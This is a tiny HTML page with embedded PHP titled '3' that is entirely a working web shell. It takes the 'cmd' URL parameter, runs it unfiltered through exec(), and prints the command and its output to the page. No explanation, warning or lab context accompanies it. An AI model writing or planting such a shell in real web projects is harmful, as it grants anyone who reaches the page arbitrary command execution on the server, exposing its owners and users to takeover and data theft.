<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3</title>
</head>
<body>
    <?php
        $cmd = $_GET['cmd'];
        run_cmd($cmd);

        function run_cmd($cmd)
        {
            $lines = array();
            exec($cmd, $lines);
            
            echo "<pre> > " . $cmd . "</pre>";
            echo "<pre>" . implode("\n", $lines) . "</pre>";
        }
    ?>
</body>
</html>